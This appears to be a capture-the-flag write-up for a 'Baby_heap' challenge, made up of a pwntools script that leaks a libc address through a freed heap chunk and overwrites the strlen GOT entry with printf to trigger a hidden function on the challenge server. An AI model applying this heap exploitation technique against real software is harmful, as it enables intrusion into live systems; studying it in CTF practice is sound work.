# Baby_heap题解
```python
from pwn import *
import argparse

context.log_level = "debug"

conn = remote('47.94.237.181', 30941)
libc_lib = ELF('E:\edge_download\ppp/libc.so', checksec=False)
binary = ELF('E:\edge_download\ppp/pwn', checksec=False)

def create_item(size):
    conn.sendlineafter(b'choice: ', b'1')
    conn.sendlineafter(b'commodity size \n', str(size).encode())

def remove_item(index):
    conn.sendlineafter(b'choice: ', b'2')
    conn.sendlineafter(b' delete: \n', str(index).encode())

def update_item(index, content):
    conn.sendlineafter(b'choice: ', b'3')
    conn.sendlineafter(b' edit: \n', str(index).encode())
    conn.sendlineafter(b'Input the content \n', str(content).encode())

def display_item(index):
  conn.sendlineafter(b'choice: ', b'4')
  conn.sendlineafter(b' show: \n', str(index).encode())
  conn.recvuntil(b'The content is here \n')
  return conn.recvuntil(b'Menu:\n')[:-6]

def hidden_function():
    conn.sendlineafter(b'choice: ', b'5')
    conn.sendlineafter(b'Maybe you will be sad !\n', b'2')

def custom_function(target_addr, content):
  conn.sendlineafter(b'choice: ', b'10')
  conn.sendafter(b'Input your target addr \n', target_addr)
  conn.send(content)
create_item(0x628)
create_item(0x618)
create_item(0x638)
create_item(0x618)

remove_item(1)
libc_lib.address = u64(display_item(1)[:8]) + 0x9c0 - libc_lib.sym['_IO_2_1_stderr_']
success("libc_lib.address = " + hex(libc_lib.address))

got_strlen_addr = libc_lib.address + 0x21a118
custom_function(p64(got_strlen_addr), p64(libc_lib.sym["printf"]))
hidden_function()

conn.interactive()
```